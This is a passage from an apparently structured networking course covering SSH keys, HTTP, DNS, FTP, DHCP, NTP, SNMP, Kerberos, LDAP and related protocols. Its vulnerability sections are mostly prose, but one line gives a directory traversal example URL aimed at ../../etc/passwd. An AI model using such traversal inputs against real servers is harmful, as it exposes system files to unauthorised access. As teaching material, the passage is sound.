    Your identification has been saved in /home/student/.ssh/id_rsa.
    Your public key has been saved in /home/student/.ssh/id_rsa.pub.
    The key fingerprint is:
    SHA256:hYXK1AXWasbCenSXR0jDLi9JXgbn2C2YL0K59cUjuSY Student
    The key's randomart image is:
    +---[RSA 4096]----+
    |       .oB=.     |
    |      ..+o=..    |
    |     + +.@.*     |
    |      O &.% *    |
    |     + XSX * .   |
    |    . + E *      |
    |     . . =       |
    |                 |
    |                 |
    +----[SHA256]-----+
Create your own SSH Public/Private keys

-t Specify the Encryption to use (rsa|dsa|ecdsa|ed25519)

-b Specify the Bit length (1024|2048|4096)

-C Adds an optional comment to better identify each key

Specify Key File Location (Optional): If you want to save the key pair to a specific location, you can specify the file path when prompted.

Set Passphrase (Optional): You can choose to set a passphrase for the private key to add an extra layer of security. If you set a passphrase, you'll need to enter it every time you use the private key.


cat ~/.ssh/id_rsa 
cat ~/.ssh/id_rsa.pub


Resources


Instructor Note


3.4.2.11 SSH-Copy-ID¶
ssh-copy-id is a convenient script used to copy the public SSH key of your local machine to a remote server's ~/.ssh/authorized_keys file. This allows you to easily set up SSH key-based authentication for accessing the remote server without needing to manually copy and paste the public key.


```
ssh-copy-id student@172.16.82.106
```
After copying the key you will be able to ssh to the remote server without needing to provide a password.


```
ssh student@172.16.82.106
student@blue-host-1:~$
```


Resources


Instructor Note


3.4.3 Analyze Hypertext Transfer Protocol (Secure) (HTTP(s))¶
HTTP(S) (TCP 80/443)



The Hypertext Transfer Protocol (HTTP) is an application layer protocol used for communication between web browsers and web servers. It serves as the foundation for data communication on the World Wide Web, enabling the retrieval and display of web pages, images, videos, and other resources.

Key characteristics and features of HTTP include:

Client-Server Architecture: HTTP follows a client-server model, where the client (usually a web browser) sends requests to the server, and the server responds with the requested data or performs the requested actions.

Stateless Protocol: HTTP is stateless, meaning each request from the client to the server is independent and does not retain any information about previous requests.

Request-Response Paradigm: Communication in HTTP is based on a request-response paradigm. The client sends an HTTP request to the server, specifying the desired action (such as retrieving a web page or submitting a form). The server processes the request and sends an HTTP response back to the client, containing the requested data or an appropriate status code.

Request Methods - performed by the client to a server.

GET - Most common method used. Used to retrieve data from a server.

POST - Used to send data to the API server. Generally used with storing a file or form.

PUT - Similar to POST. Used to send data to the API to update or create a resource. It differs from POST in that it is used only on a particular resource.

PATCH - used to apply partial modifications to the resource.

DELETE - used to delete the resource at the specified URL.

HEAD - Similar to GET except it does not return the message body.

OPTIONS - used to return data describing what other methods and operations the server supports at the given URL.

HTTP Methods from iana.org

HTTP server status Codes - server response to a request method.

1xx - Informational

2xx - Successful

3xx - Redirection

4xx - Client error

5xx - Server error

HTTP status codes from iana.org

Uniform Resource Identifiers (URIs): HTTP uses URIs to identify resources on the web. A URI is a broader concept that encompasses both URLs and URNs. It is a string of characters that identifies or names a resource on the internet. A URI provides a unique and standardized way to refer to a resource, regardless of its location or retrieval mechanism. URIs can be used to identify web pages, files, services, email addresses, telephone numbers, and more.


foo://example.com:8042/over/there?name=ferret#nose
Uniform Resource Locator (URL): A URL is a specific type of URI that provides the complete address and access mechanism for a resource on the internet. It specifies the location of a resource and the protocol required to access it.

http://www.ietf.org/rfc/rfc2396.txt
Governed by the these RFCs: RFC 7230, RFC 7231, RFC 7232, RFC 7233, RFC 7234, RFC 7235, RFC 5785, RFC 6266, RFC 6585, RFC 2817, RFC 2818, RFC 5246, RFC 6101


Resources


Instructor Note


3.4.3.1 Quick UDP Internet Connections (QUIC)¶
HTTPs QUIC (UDP 443)

QUIC (Quick UDP Internet Connections): Developed by Google, QUIC serves as a cutting-edge transport layer protocol meticulously crafted to elevate the speed and security of web applications, strategically designed to surmount limitations inherent in conventional transport protocols like TCP (Transmission Control Protocol).

UDP-Based Operation: Functioning over the User Datagram Protocol (UDP), QUIC introduces a nimble and connectionless communication paradigm, optimizing the transmission of data.

Latency Reduction Engineering: At its core, QUIC is an engineering marvel dedicated to mitigating latency compared to TCP. This achievement is realized through innovative mechanisms, including connection multiplexing and a streamlined round-trip handshake process.

Integration with HTTP/3: Inextricably linked with the HTTP/3 protocol, QUIC seamlessly provides a secure and highly efficient transport layer, propelling the evolution of the Hypertext Transfer Protocol into its next generation.



Resources


Instructor Note


3.4.3.2 HTTP Vulnerabilities¶
HTTP (Hypertext Transfer Protocol) is a fundamental protocol for communication on the World Wide Web. While it is the foundation for data communication on the web, it has had historical vulnerabilities that could pose risks to security.

HTTP is vulnerable to various Denial of Service (DoS) attacks.

Flooding the HTTP Server:

HTTP flood: floods the target server with a high volume of legitimate-looking HTTP requests, consuming its resources and causing it to become unresponsive.

HTTP GET/POST Flood: The attacker sends a large number of HTTP GET or POST requests to overwhelm the server and exhaust its resources.

SYN Flood: The attacker sends massive amounts of SYNs to try to consume all the connections.

HTTP Amplification: the attacker leverages misconfigured or vulnerable web servers to amplify the attack traffic, making it appear as if the requests are originating from multiple sources.

Low and Slow attacks:

Slow Loris: attack functions by opening connections to a targeted Web server and then keeping those connections open as long as it can.

R U Dead Yet? (RUDY): aims to keep a web server tied up by submitting form data at an absurdly slow pace.

Drive by Downloads: is the unintentional downloading of malicious software onto a user's device when visiting a website or clicking on a compromised advertisement or link. The term "drive-by" implies that the download happens automatically and without the user's knowledge or consent. Drive-by downloads take advantage of vulnerabilities in web browsers, browser plugins, or operating systems to initiate the download of malicious files.

BeEF Framework: The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. It is a tool designed to enable an attacker to use a target's browser as an attack point.

Man-in-the-Middle Attack: Attackers can intercept and alter communication between a client and server, leading to unauthorized access, data manipulation, or eavesdropping.

Session Hijacking: Attackers may steal session identifiers, allowing them to impersonate a user and gain unauthorized access to sensitive information.

Cross-Site Scripting (XSS): Malicious scripts are injected into web pages viewed by other users, potentially leading to the theft of sensitive information or session hijacking.

Cross-Site Request Forgery (CSRF): Unauthorized commands are transmitted from a user that the web application trusts, potentially leading to actions performed on behalf of the user without their consent.

Directory Traversal Attacks: Attackers exploit insufficient security controls to access files or directories beyond the intended scope, potentially exposing sensitive data.

http://example.com/view?file=../../etc/passwd


Demo of SYN Flood with Scapy


Resources


Instructor Note


3.4.4 Analyze Domain Name System (DNS) protocol¶
DNS (QUERY/RESPONSE) (TCP/UDP 53)

Used as a means to resolve domain names to an IP addresses usable by the client system. Typically used to resolve IP addresses of web domains.

Client queries and server responses are typically sent using UDP port 53.

DNS responses over UDP are generally limited to 512 bytes. This limit is due to the constraints of the original DNS protocol specification and the size of a UDP packet. If the response data exceeds this limit, DNS switches to TCP to handle the query.

TCP is used when DNS responses are larger than 512-bytes.

DNS Zone transfers are typically over 512-bytes so TCP is used for the transmission.

Zone transfers are used to replicate DNS databases between DNS servers. These transfers can involve a large amount of data, especially for zones with many records. DNS zone transfers are conducted using TCP because they typically involve transferring large amounts of data.







Resources


Instructor Note


3.4.4.1 Examine DNS usage with UDP and TCP¶
DNS-over-UDP/53 ("Do53")

DNS has primarily answered queries using UDP 53, queries consist of a clear-text request sent in a single UDP packet from the client, responded to with a clear-text reply sent in a single UDP packet from the server. Lacks transport-layer encryption, authentication, reliable delivery, and message length.
DNS-over-TCP/53 ("Do53/TCP")

DNS can use TCP for DNS queries, replies but particularly is used in zone transfers. Transfer of DNS records between a Primary and Secondary DNS Servers require the use of TCP protocol. The requirement here is that TCP, due to its reliability makes sure zone data is consistent across DNS servers. When a client doesn’t receive a response from DNS, it re-transmits the query using TCP after 3-5 seconds of interval.


Resources


Instructor Note


3.4.4.2 Explain DNS Records¶
A DNS servers contains a "zone file" for each domain, and the zone file is made up of "resource records" (RRs) which acts as instructions for the DNS server.

Common list of records are:

Type A

IPv4 Address record, used to map hostnames to an IP address of the host.
Type AAAA

IPv6 address record, used to map hostnames to an IPv6 address of the host.
Type MX

Mail exchange record, Maps a domain name to a list of message transfer agents for that domain.
Type TXT

Text record, human-readable text in a DNS record, but can also store machine-readable data. Often used for verification and authentication.
Type NS

Name Server record, specifies the authoritative name servers for a domain.
Type SOA

Start of authority, provides authoritative information about the zone, including administrative details and zone-level settings.
Type AXFR

AXFR (Full Zone Transfer) facilitates the transfer of the entire DNS zone data, including all resource records, from one DNS server (the master) to another DNS server (the slave).
Type IXFR

IXFR (Incremental Zone Transfer) Retrieves only the changes made since the last transfer.
Type CNAME

Canonical Name creates an alias for a domain name, pointing it to another canonical domain.
Type PTR

Used for reverse DNS lookups to map an IP address to a domain name.
A extended list of records can be found here: DNS record types

Linux command to view records: dig



Example:


dig stackoverflow.com


Windows command to view records:


ipconfig /displaydns


Resources


Instructor Note


3.4.4.3 Explain DNS architecture¶


DNS Root Zone. Authoritative name servers managed by IANA with 13 root servers around the world.

a.root-servers.net 198.41.0.4, 2001:503:ba3e::2:30 Verisign, Inc.

b.root-servers.net 199.9.14.201, 2001:500:200::b University of Southern California,

c.root-servers.net 192.33.4.12, 2001:500:2::c Cogent Communications

d.root-servers.net 199.7.91.13, 2001:500:2d::d University of Maryland

e.root-servers.net 192.203.230.10, 2001:500:a8::e NASA (Ames Research Center)

f.root-servers.net 192.5.5.241, 2001:500:2f::f Internet Systems Consortium, Inc.

g.root-servers.net 192.112.36.4, 2001:500:12::d0d US Department of Defense (NIC)

h.root-servers.net 198.97.190.53, 2001:500:1::53 US Army (Research Lab)

i.root-servers.net 192.36.148.17, 2001:7fe::53 Netnod

j.root-servers.net 192.58.128.30, 2001:503:c27::2:30 Verisign, Inc.

k.root-servers.net 193.0.14.129, 2001:7fd::1 RIPE NCC

l.root-servers.net 199.7.83.42, 2001:500:9f::42 ICANN

m.root-servers.net 202.12.27.33, 2001:dc3::35 WIDE Project

Top Level Domains (Level 1). Top-Level Domains (TLDs) are the highest level of domain names in the hierarchical Domain Name System (DNS) structure.

Generic:

.com: Commercial organizations

.org: Non-profit organizations

.net: Network infrastructure providers

.edu: Educational institutions

.gov: U.S. government agencies

.mil: U.S. military organizations

.int: International organizations

.info: General information websites

.biz: Business-related websites

.name: Personal websites

Country Code:

.us: United States

.uk: United Kingdom

.de: Germany

.fr: France

.jp: Japan

.au: Australia

.ca: Canada

.in: India

.br: Brazil

.cn: China

.ru: Russia

2nd Level Domains. Second-level domains are commonly used to identify specific organizations, businesses, or individuals on the internet.

.com TLD:

google.com

amazon.com

microsoft.com

apple.com

.org TLD:

wikipedia.org

mozilla.org

redcross.org

eff.org

.net TLD:

stackoverflow.net

behance.net

etsy.net

change.org

Country Code TLDs (ccTLDs):

bbc.co.uk (United Kingdom)

alibaba.cn (China)

naver.com (South Korea)

lefigaro.fr (France)

DNS Sub-Domain. A subdomain is a part of a larger domain, placed to the left of the main domain name, that allows further organization and subdivision of the DNS hierarchy. It allows website owners to create additional sections or subdivisions under their primary domain.

Organization-based Subdomains:

sales.example.com

hr.companyname.com

support.domainname.com

Geographic-based Subdomains:

us.example.com

uk.domainname.com

ca.website.com

Service-based Subdomains:

blog.domainname.com

shop.example.com

forum.domainname.com

Product-based Subdomains:

product1.domainname.com

product2.example.com

app.domainname.com

Mobile-specific Subdomains:

m.domainname.com

mobile.example.com

mobileapp.domainname.com

Language-based Subdomains:

en.example.com

fr.domainname.com

es.website.com



DNS delegates the responsibility of assigning domain names and mapping those names to Internet resources by designating authoritative name servers for each domain. Network administrators may delegate authority over sub-domains of their allocated name space to other name servers. This mechanism provides distributed and fault-tolerant service and was designed to avoid a single large central database.

DNS record lookup process starts when a host machine types in a website to browse to.

The computer will check it's local "DNS cache" for a record.

If a record is not found, then the request will go to a "recursive resolver" normally located at the ISP.

If a record is not found, then the request will go to 1 of the 13 global "root name servers". These servers are named A through M.

If a record is not found, then the request will go to the respective "Top Level Domain (TLD) nameserver". TLDs are divided into two distinct sub-categories organizational hierarchy (commercial for .com, organizational for .org, etc) and geographical (New Zealand for .nz, Georgia for .ga, etc) hierarchy.

If a record is not found, then the request will go to the "authoritative nameserver" within the zone. For www.google.com, Google will be the authoritative nameserver. The record will be located here and a response will be set back to the requestor(s).







Resources


Instructor Note


3.4.5 Analyze File Transfer Protocol (FTP)¶
FTP (TCP 20/21)




* <a href="https://www.geeksforgeeks.org/file-transfer-protocol-ftp-in-application-layer/" target="_blank">FTP Reference</a>

* <a href="https://www.cloudshark.org/captures/abdc8742488f" target="_blank">FTP PCAP from cloudshark</a>
Published in RFC 959, File Transfer Protocol is a standard network protocol that is used for file transfer between a client and a server. Authentication is performed via a username and password, but can also be disabled in favor of anonymous mode if the FTP server is configured for it. The drawback with FTP is that all communication is clear text, including the initial authentication.

FTP has two modes of operation, Active and Passive.



Resources


Instructor Note


3.4.5.1 FTP Active¶
A client initiates a connection with a server on port 21 from the client's ephemeral high port. The three way handshake is completed and the client listens on its ephemeral high port + 1, the client sends the port N+1 command to the server on port 21 (control port). Ex: if the command to the server is from ephemeral port 1026, it would listen on port 1027. Once that is done, the server initiates a connection to the client's ephemeral high (1027) from the server's data port (20) and the data is transferred.


Active FTP Diagram Walk-through

The client's command port contacts the server's command port and sends a command for the client's ephemeral high port + 1

The FTP server responds to the client with an ACK to the client's command port

The FTP server initiates a connection from its data port 21 to the client's specified data port (ephemeral high + 1)

The FTP client sends an ACK back to the server's data port 20 from the client's ephemeral high data port. This also leads to issues when using ftp through an SSH tunnel which will be discussed later.



FTP Active Issues

A stateful firewall would pass along the FTP traffic initially over port 21 (control port)

The server later tries connects back to the client over the port specified during the control communication (ephemeral high +1) from it's data port 20.

The FTP client never makes the actual data connection, the client tells the server what port it is listening on for the data connection. On the client side, this would appear to be a system initiating a connection to an internal client that was unsolicited. This also presents issues with FTP through SSH tunnels.



Resources


Instructor Note


3.4.5.2 FTP Passive¶
Passive FTP sidesteps the issue of Active mode by reversing the conversation. The client initiates both the command and data connections.


Passive FTP Diagram Walk-through

The client's command port (1029) contacts the server's command port (20) and sends the PASV command.

The FTP server responds to the client with an ACK to the client's ephemeral high command port (1029) letting the client know the server's listening data port (2020).

The FTP client initiates the data connection from its ephemeral high port (1030) to the FTP server's listening data port (2020)

The FTP server sends an ACK back to the client's ephemeral high data port (1030)



Resources


Instructor Note


3.4.6 Analyze Trivial File Transfer Protocol (TFTP)¶
TFTP (UDP 69)

Trivial File Transfer Protocol (TFTP) is a simple File Transfer Protocol which allows a client to get/put a file from/to a remote host. One of its primary uses is in the early stages of nodes booting from a local area network.

TFTP has been popular due to its simple easy of implementation.

IT pros and Sys Admins typically use TFTP configuration for:

Transferring files

Remote-booting without hard drives

Upgrading codes

Backing up network configurations

Backing up router configuration files

Saving IOS images

Booting PCs without a disk





Resources


Instructor Note


3.4.7 Analyze Simple Mail Transfer Protocol (SMTP)¶
SMTP (TCP 25)

Simple Mail Transfer Protocol (SMTP) is an internet standard used for sending electronic mail. SMTP is not encrypted and will require other methods to secure the data.




Resources


Instructor Note


3.4.8 Analyze Post Office Protocol (POP)¶
POP (TCP 110)

Post Office Protocol (POP) is an older internet standard used to retrieve electronic mail from a server. Most implementations of POP will delete the server stored mail once the client downloads them. This meant that the client can only read the email from the system that was used to download them. The latest version is POP3.




Resources


Instructor Note


3.4.9 Analyze Internet Message Access Protocol (IMAP)¶
IMAP (TCP 143)

Similar to POP in that it is used to download electronic mail from a server. It differs from POP in that it typically synchronizes with the server so that the client can download the mail but have it still stored on the server. This allowed clients to retrieve their emails from multiple systems. The current implementation is IMAP4.




Resources


Instructor Note


3.4.10 Analyze Dynamic Host Configuration Protocol (DHCP) version 4 and 6 protocol¶
DHCP (UDP 67/68)

Dynamic Host Configuration Protocol (DHCP) is an internet standard used to assign IP address parameters across an enterprise. This prevent administrators from having to manually assign IP configuration on each host individually. Clients communicate with the server over UDP port 67 and the server communicates with the client over UDP port 68.

IPv4 DHCP process (D.O.R.A)

Discover - Sent as a L2 and L3 broadcast by the client to discover a DHCP server. Broadcast can only reach devices on the same network. If the DHCP server is not on the local network then the router must use the ip helper command to relay these requests to a centralized DHCP server.

Offer - Sent as a unicast to the client. The offer will contain the offered IP address configurations.

Request - Sent as a broadcast back to the server. This is broadcasted because the client could have received 2 or more offers. The broadcast will announce to all DHCP servers as to which offer was accepted. The client will send a gratuitous ARP to attempt to determine if the IP address is already in use.

Acknowledge - Final response from the server sent as a unicast to the client to confirm the lease reservation. Will contain the expiration timeframe of the lease.

IPv6 DHCP process - Similar to the process of DHCPv4 except the names and communication methods differ.

Solicit - Sent to the server as a multicast.

Advertise - Unicast response from server.

Request - Multicast to the server.

Reply - Unicast server response.







Resources


Instructor Note


3.4.10.1 Explain DHCP Vulnerabilities¶
DHCP is a very useful protocol but is not impervious to its share of attacks and vulnerabilities.

Rogue DHCP - (Sometimes referred to as Pineapple) - This is where a malicious person places their own DHCP server on a victim's network. The IP address assignments will still be in the valid scope for the network but the attacker can use himself as the gateway to easily perform MitM attacks. The attacker can also assign their own DNS server address for domain to IP resolution. This means that the attacker can resolve and valid domain name to an IP address of their choosing. This can cause victims to go to the attacker's specially crafted websites to steal credentials and other information.

DHCP Starvation - The attacker may not want to compete with a valid DHCP server for address assignments. To ensure that their configurations are accepted they will attempt to send numerous fake DHCP requests to the valid server to exhaust their pool of addresses. This will force all users to get their IP configurations from the rogue DHCP.



Resources


Instructor Note


3.4.11 Analyze Network Time Protocol (NTP) and vulnerability¶
NTP (UDP 123)

The Network Time Protocol (NTP) is a networking protocol for clock synchronization between computer systems over packet-switched, variable-latency data networks. NTP is intended to synchronize all participating computers to within a few milliseconds of Coordinated Universal Time (UTC).



Uses stratum levels to determine the distance from the "authoritative" time source.

Stratum 0 - Identifies the device as the "authoritative" time source.
Stratum 1 - Syncs their time from Stratum 0.
Stratum 2 - Syncs their time from Stratum 1.
Stratum 3 to 15 - Follows same scheme as above. Stratum 15 is the highest level.
Stratum 16 - Signifies that the device is unsynchronized.


Vulnerabilities:

Time synchronization is critical for certain communications. Microsoft Active Directory uses time synchronization for all hosts in the domain. It allows for a certain margin of time error and once that is exceeded the client is "disjoined" from the domain and users can no longer log in. Other systems and protocols also use time synchronization and can easily be exploited. A malicious person can craft NTP messages in attempt to throw off the domain timing and create issues.



NTP Timestamp Manipulation (Time-based attacks)

Overview: Attackers can manipulate the time synchronization mechanism of a system using NTP. Since many systems rely on accurate time for operations (e.g., log timestamps, SSL/TLS certificates, etc.), manipulating time can cause a range of issues.
How it works: By providing false NTP responses or hijacking the NTP communication, attackers can force a system to accept incorrect time, leading to:
Disruptions in log files and event tracking.
Problems with time-based authentication protocols (such as Kerberos).
Invalid SSL/TLS certificate validation.
Man-in-the-Middle Attacks (MITM) on NTP

Overview: In more sophisticated attacks, a man-in-the-middle (MITM) attack can be used to intercept and alter NTP traffic, causing systems to synchronize to incorrect time servers or manipulate the data being exchanged.
How it works: Attackers can intercept NTP traffic between clients and servers, modifying the time synchronization process. This can lead to time discrepancies or the use of malicious time sources, which could then be used to exploit time-sensitive protocols or cause failures in time-sensitive applications.


Resources


Instructor Note


3.4.12 Analyze Terminal Access Controller Access-Control System Plus (TACACS+) Protocol¶
TACACS (TCP 49) SIMPLE/EXTENDED

The Terminal Access Controller Access-Control System Plus (TACACS+) is a network security protocol used for centralized authentication, authorization, and accounting (AAA) services in network devices such as routers, switches, and firewalls. Developed by Cisco Systems, TACACS+ provides a robust framework for controlling access to network resources and enforcing security policies.






Resources


Instructor Note


3.4.13 Analyze Remote Authentication Dial-In User Service (RADIUS) protocol¶
RADIUS (UDP 1645/1646 AND 1812/1813)

Remote Authentication Dial-In User Service (RADIUS) is a open standard networking protocol used for centralized authentication, authorization, and accounting (AAA) services in network environments. It enables devices like network access servers (NAS), VPN gateways, and wireless access points to authenticate users and authorize their access to network resources.




Resources


Instructor Note


3.4.14 Analyze Diameter Protocol¶
DIAMETER (TCP 3868)



Diameter is a networking protocol used for Authentication, Authorization, and Accounting (AAA) functions in network systems, primarily in telecommunications networks. It is an evolution of the older RADIUS (Remote Authentication Dial-In User Service) protocol, providing enhanced features and capabilities.

Diameter protocol was develop to enhance the AAA capablities that RADIUS does not support. Such as:

Supports application-layer acknowledgments and defines failover algorithms and the associated state machine.

Transmission-level security support via TLS/TCP and DTLS/SCTP. Diameter can work over TCP, Stream Control Transmission Protocol (SCTP), or UDP. SCTP is recommended.

Diameter includes support for error handling, capability negotiation, and mandatory/non-mandatory Attribute-Value Pairs (AVPs).

Header information:

Version - field MUST be set to 1 to indicate Diameter Version 1.

Message Length - indicates the length message including the header fields and the padded AVPs. Message Length field is always a multiple of 4.

Command Flags - R(equest), P(roxiable), E(rror), T(Potentially retransmitted message), or r(eserved).

Command Code - used in order to communicate the command associated with the message.

Application ID - enables the base protocol stack to route the message to the Accounting, Authentication, or the other Diameter applications.

Hop-by-Hop Identifier - correlates the information with the peer (next-hop or neighbor) entity.

End-to-End Identifier - correlates the information with the endpoint for the transaction, which may be several hops away.

AVPs - are a method of encapsulating information relevant to the Diameter message.



Resources


Instructor Note


3.4.15 Analyze Simple Network Management Protocol (SNMP)¶
SNMP (UDP 161/162)

Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.

3 Key SNMP Components

SNMP Manager - It is a centralized system used to monitor the network. It is also known as Network Management Station (NMS)

SNMP agent - It is a software management software module installed on a managed device. Managed devices can be network devices like PC, router, switches, servers, etc.

Management Information Base - MIB consists of information on resources that are to be managed. This information is organized hierarchically. It consists of objects instances which are essentially variables.

SNMP Versions

SNMPv1 – This was the first implementation, operating within the structure management information specification, and described in RFC 1157. It uses community strings for authentication and UDP only.

SNMPv2c – This version has improved support for efficiency and error handling and is described in RFC 1901. It was first introduced in RFC 1441 and is more appropriately known as SNMP v2c. It uses community strings for authentication. It uses UDP but can be configured to use TCP.

SNMPv3 – This version improves security and privacy. It was introduced in RFC 3410. It uses Hash-based MAC with MD5 or SHA for authentication and DES-56 for privacy. This version uses TCP. Therefore, the higher the version of SNMP, the more secure it will be.

noAuthNoPriv – This (no authentication, no privacy) security level uses community string for authentication and no encryption for privacy.

authNopriv – This security level (authentication, no privacy) uses HMAC with MD5 or SHA for authentication and no encryption is used for privacy.

authPriv – This security level (authentication, privacy) uses HMAC with MD5 or SHA for authentication and encryption uses DES-56(56-bit) algorithm, 3DES(168-bit), AES(128/192/256-bit).



Vulnerabilities:

SNMP v1 and v2 traffic is sent as clear text. It also has generally weak passwords. This means that attackers can potentially sniff the network this traffic and can be used to gather sensitive information about the network and its devices. Should the passwords be compromised, the attacker can probe SNMP enabled devices for information and disable SNMP traps that would otherwise trigger when certain actions occur.





Resources


Instructor Note


3.4.16 Analyze Real-time Transport Protocol (RTP)¶
RTP (UDP any above 1023)



RTP (Real-time Transport Protocol) is primarily used for streaming real-time media over IP networks. It is a protocol specifically designed for transmitting audio and video data in a way that supports time-sensitive applications, such as voice and video communication, streaming media, and live broadcasts.

Voice over IP (VoIP): RTP is widely used in VoIP applications to transport real-time voice data packets over IP networks. It works in conjunction with protocols like SIP (Session Initiation Protocol) to enable voice communication over the internet.

Video Conferencing: RTP forms the basis of video conferencing systems, allowing participants to transmit and receive real-time video streams during live meetings or conferences.

Streaming Media: RTP is commonly used for streaming media services, such as online video streaming platforms, live broadcasts, and webinars. It facilitates the efficient transmission of video and audio data to multiple clients in real-time.

IPTV (Internet Protocol Television): RTP is used in IPTV systems to deliver television content over IP networks, enabling users to stream television programs and video-on-demand services over the internet.

Multimedia Applications: RTP is utilized in various multimedia applications, including gaming, remote monitoring, video surveillance, and interactive multimedia services. It provides a reliable and efficient transport mechanism for transmitting time-sensitive media data.

Real-time Data Transmission: RTP can be used for real-time data transmission scenarios where timely delivery is crucial. For example, it may be employed in sensor networks, control systems, or any application that requires the transmission of real-time data streams.



Resources


Instructor Note


3.4.17 Analyze Remote Desktop Protocol (RDP)¶
RDP (TCP 3389)

Developed by Microsoft to offer remote access to a computer's desktop GUI as if they was physically at the system rather than just a command-line interface.

The protocol is widely supported across most Windows, Unix, Linux, and macOS operating systems. Other proprietary options were developed to provide remote desktop support but the administrator typically must install the client software on each device before being able to remotely access devices with these 3rd party tools.





Resources


Instructor Note


3.4.18 Analyze Kerberos¶
Kerberos (UDP 88)

Kerberos is a network authentication protocol that ensures secure authentication for client-server applications. It was created by MIT as a network authentication protocol using secret-key cryptography. It relies on a trusted Key Distribution Center (KDC) server.

Here's a simplified explanation of the Kerberos process:

Authentication Request:

The client sends an authentication request to the KDC, providing its identity (username) and the desired server's identity (service principal name).
Ticket Granting Ticket (TGT) Request:

The KDC verifies the client's identity and issues a TGT if the credentials are valid.

The TGT is encrypted using the client's password or a shared secret key.

TGT Issuance:

The KDC sends the encrypted TGT to the client, which stores it securely.
Service Ticket Request:

When the client wants to access a specific service, it requests a Service Ticket (ST) for that service from the KDC.

The request includes the TGT and the desired service's identity.

ST Issuance:

The KDC verifies the TGT and issues an ST for the requested service if the TGT is valid.

The ST is encrypted using a session key shared between the client and the service.

Service Access:

The client presents the ST to the service, proving its authenticity and intent to access the service.

The service decrypts the ST using the session key and verifies its validity.

If the ST is valid, the service grants access to the client.

Kerberos utilizes symmetric key cryptography for secure ticket encryption and decryption, ensuring data confidentiality and integrity. It also supports mutual authentication between the client and server.

Kerberos is widely used in enterprise environments, particularly in Microsoft Windows with Active Directory. It ensures secure authentication and access to network resources while protecting against unauthorized access and replay attacks.



Resources


Instructor Note


3.4.19 Analyze Lightweight Directory Access Protocol (LDAP)¶
LDAP (TCP 389 and 636)

The Lightweight Directory Access Protocol (LDAP) is an application protocol used for accessing and managing distributed directory information services. LDAP provides a standardized method for querying, modifying, and authenticating against directory services, such as Active Directory and OpenLDAP.

LDAPS (LDAP over SSL/TLS) is a secure communication protocol used to encrypt LDAP traffic between LDAP clients and servers. It provides a layer of security to LDAP authentication and directory access by encrypting data exchanged over the network, protecting it from eavesdropping and tampering.

LDAP provides access to distributed directory services that act in accordance with X.500 data and service models. These protocol elements are based on those described in the X.500 Directory Access Protocol (DAP).

LDAP as an authentication service follows the client/server model. The LDAP model has two main steps when a user requests non-TLS bind authentication. These are (in order):

TCP three-way handshake (SYN, SYN/ACK, ACK)
LDAP bind() function (performed synchronous or asynchronous)
LDAP:


* LDAP (unencrypted): TCP Port 389
* LDAPS (LDAP over SSL/TLS): TCP Port 636
* follows a client-server model, where LDAP clients send requests to directory servers, which in turn provide responses.
* hierarchical data stores that organize and store structured information, such as user profiles, organizational units, and network resources.
* uses a directory schema to define the structure and attributes of directory entries, allowing for flexible data modeling.
* supports various operations, including search, add, modify, delete, and bind (authentication).
* uses a string-based query language called the LDAP Data Interchange Format (LDIF) to search and retrieve data from directory servers.


LDAP Directory Structure - Directory Information Tree (DIT):

The DIT is a hierarchical structure that organizes entries based on their distinguished names (DNs). The hierarchy is similar to a file system directory tree and is composed of:

Entries: Each entry represents an object in the directory, such as a user, group, or organization.

Root: The top-level of the hierarchy. The root entry is the starting point of the directory tree.

Example: The root DN might be something like dc=example,dc=com, representing the top-level domain for the directory.
Base DN: The starting point for searches within the directory. It represents a specific part of the hierarchy from which you want to begin your search.

Example: ou=Users,dc=example,dc=com might be used as the base DN for searching user entries.
Organizational Units (OUs): Containers within the directory used to organize entries into logical groups, such as departments or roles.

Example: ou=Sales,dc=example,dc=com and ou=IT,dc=example,dc=com.
Entries: Individual objects in the directory, each identified by a unique DN. Entries can represent users, groups, devices, etc.

Example: uid=johndoe,ou=Users,dc=example,dc=com represents a user entry for John Doe.
Attributes: Each entry contains a set of attributes, which are key-value pairs representing information about the entry.

Attribute Syntaxes: LDAP attributes have associated syntaxes, which define the data type and format of the attribute's values. Common syntaxes include:

String: Textual data

Integer: Integer values

Boolean: True or false values

DN: Distinguished Name (reference to another entry)

GeneralizedTime: Date and time

User Attributes

uid: Unique identifier for the user (often the username)

cn: Common name (usually the full name)

sn: Surname

givenName: Given name

mail: Email address

telephoneNumber: Phone number

description: Additional information about the user

userPassword: Password (though storing passwords in plain text is highly discouraged)

memberOf: Groups the user belongs to

Group Attributes

cn: Common name of the group

description: Description of the group

member: List of members (usually user DNs)

Computer Attributes

cn: Common name of the computer

description: Description of the computer

operatingSystem: Operating system

ipaddress: IP address

Distinguished Name (DN): The unique identifier for each entry, constructed from the hierarchical components of the tree. A DN is constructed from a sequence of attribute-value pairs, each representing a level in the directory hierarchy. The DN consists of one or more Relative Distinguished Names (RDNs), separated by commas.

Example:


dn: cn=John Doe,ou=users,ou=ImportantPeople,ou=VIPs,dc=example,dc=com

objectClass: inetOrgPerson
uid: john.doe
cn: John Doe
sn: Doe
givenName: John
mail: john.doe@example.com
description: An Important VIP user
telephoneNumber: +1-555-555-5555
userPassword: password123
memberOf: cn=Developers,ou=Groups,dc=example,dc=com
memberOf: cn=Managers,ou=Groups,dc=example,dc=com 


LDAP servers are vulnerable from DoS attacks (SYN Flooding) and protecting user passwords from being discovered over a network.

Traffic Capture¶
Lesson Number: 112-CCTC15

Slides¶
Traffic Capture Slides
4.0 Outcomes¶
Describe Network Traffic Sniffing
Explain the capture Libraries
Describe the use of sniffing tools and methods
Check on Learning
Perform real-time network traffic sniffing
Explain TCPDUMP primitives
Define the function of a Berkley packet filter (BPF)
Compare primitives and BPFs
Construct a BPF
Use a BPF to filter packets entering a network interface
Understand Wireshark's use of BPFs
Describe passive OS fingerprinting (p0f)
Use p0f to capture packets
Check on Learning


